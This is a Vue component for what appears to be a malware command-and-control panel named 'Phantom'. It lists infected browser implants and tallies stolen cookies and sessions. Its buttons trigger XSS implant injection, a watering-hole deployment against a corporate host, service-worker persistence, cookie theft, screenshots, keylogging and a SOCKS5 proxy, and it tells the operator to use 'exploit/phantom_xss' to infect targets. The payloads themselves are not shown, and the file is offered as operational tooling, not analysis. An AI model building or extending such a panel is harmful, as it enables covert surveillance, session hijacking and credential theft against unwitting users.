<template>
  <div class="flex gap-3 h-full">
    <div class="flex-1 space-y-3">
      <div class="glass-panel p-4">
        <div class="flex items-center justify-between mb-3">
          <h3 class="text-sm font-mono text-purple">BROWSER MESH NETWORK</h3>
          <span class="text-xs text-gray-600 font-mono">{{ phantom.nodes.length || 0 }} nodes · WebRTC P2P</span>
        </div>
        <div v-if="phantom.loading" class="text-center text-gray-600 py-8 text-xs">Loading mesh data...</div>
        <div v-else class="grid grid-cols-4 gap-3">
          <div v-for="node in displayNodes" :key="node.id ?? node.node_id"
            class="glass-panel p-3 text-center hover:border-purple transition-all cursor-pointer">
            <div class="text-neon text-lg mb-1">{{ (node.browser || '?').split(' ')[0] }}</div>
            <div class="text-xs text-gray-400 font-mono">{{ node.os || node.url || '?' }}</div>
            <div class="text-xs text-gray-500 mt-1 truncate">{{ node.url || node.id || '?' }}</div>
            <div class="flex justify-center gap-2 mt-2">
              <span v-if="node.sw_persisted" class="text-neon text-xs">⚡ SW</span>
              <span class="inline-block w-2 h-2 rounded-full bg-neon animate-pulse-slow"></span>
              <span class="text-neon text-xs">{{ node.status || 'active' }}</span>
            </div>
          </div>
          <div v-if="displayNodes.length === 0"
            class="col-span-4 text-center text-gray-600 py-8 text-xs font-mono">
            No browser implants deployed. Use "exploit/phantom_xss" to infect a target.
          </div>
        </div>
      </div>

      <div class="grid grid-cols-5 gap-2">
        <div class="glass-panel p-2 text-center">
          <div class="text-lg font-mono text-neon">{{ phantom.stats?.totalNodes || displayNodes.length }}</div>
          <div class="text-xs text-gray-500">Implants</div>
        </div>
        <div class="glass-panel p-2 text-center">
          <div class="text-lg font-mono text-purple">{{ phantom.stats?.activeNodes || activeCount }}</div>
          <div class="text-xs text-gray-500">Active</div>
        </div>
        <div class="glass-panel p-2 text-center">
          <div class="text-lg font-mono text-yellow-400">{{ phantom.stats?.cookiesTotal || 0 }}</div>
          <div class="text-xs text-gray-500">Cookies</div>
        </div>
        <div class="glass-panel p-2 text-center">
          <div class="text-lg font-mono text-neon">{{ phantom.stats?.sessionsTotal || 0 }}</div>
          <div class="text-xs text-gray-500">Sessions</div>
        </div>
        <div class="glass-panel p-2 text-center">
          <div class="text-lg font-mono text-purple">{{ phantom.stats?.swPersisted || swCount }}</div>
          <div class="text-xs text-gray-500">SW Active</div>
        </div>
      </div>
    </div>

    <div class="glass-panel w-72 p-3 space-y-2 text-xs font-mono overflow-y-auto">
      <h3 class="text-purple mb-2">PHANTOM ACTIONS</h3>
      <button @click="act('inject_xss', {target_url:'https://corp.local'})" class="btn w-full text-left" :disabled="phantom.loading">🎯 Inject XSS Implant</button>
      <button @click="act('watering_hole', {target_site:'https://corp.local'})" class="btn w-full text-left" :disabled="phantom.loading">💧 Watering Hole Deploy</button>
      <button @click="act('sw_persist')" class="btn w-full text-left" :disabled="phantom.loading">⚡ Service Worker Persist</button>
      <button @click="act('steal_cookies')" class="btn w-full text-left" :disabled="phantom.loading">🍪 Steal Cookies</button>
      <button @click="act('screenshot')" class="btn w-full text-left" :disabled="phantom.loading">📸 Capture Screenshot</button>
      <button @click="act('keylogger')" class="btn w-full text-left" :disabled="phantom.loading">⌨️ Start Keylogger</button>
      <button @click="act('socks5')" class="btn w-full text-left" :disabled="phantom.loading">🔌 Enable SOCKS5</button>
      <div class="border-t border-gray-800 pt-2 mt-2">
        <button @click="refresh" class="btn w-full text-center text-gray-500" :disabled="phantom.loading">↻ Refresh Status</button>
      </div>
    </div>
  </div>
</template>

<script setup>
import { computed, onMounted } from 'vue'
import { usePhantomStore } from '../stores/phantom.js'

const phantom = usePhantomStore()

const displayNodes = computed(() => phantom.nodes.length > 0 ? phantom.nodes : [])
const activeCount = computed(() => displayNodes.value.filter(n => n.status === 'active').length)
const swCount = computed(() => displayNodes.value.filter(n => n.sw_persisted).length)

const act = async (action, params = {}) => {
  await phantom.execute(action, params)
}

const refresh = async () => {
  await Promise.all([phantom.fetchNodes(), phantom.fetchStatus()])
}

onMounted(refresh)
</script>
